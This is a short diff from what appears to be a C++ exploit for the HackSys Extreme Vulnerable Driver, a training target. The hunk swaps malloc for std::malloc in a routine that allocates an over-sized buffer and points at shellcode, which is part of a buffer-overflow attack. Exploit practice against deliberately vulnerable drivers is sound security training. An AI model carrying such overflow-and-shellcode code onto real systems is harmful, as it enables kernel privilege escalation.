@@ -49,7 +49,7 @@ public:
 	}
 
 	auto interact() -> void {
-		data = malloc(HACKSYS_EVD_BUFFER_OVERFLOW_SIZE + 0x4);
+		data = std::malloc(HACKSYS_EVD_BUFFER_OVERFLOW_SIZE + 0x4);
 		if (data == nullptr)	return;
 
 		auto payload = &ShellCode;
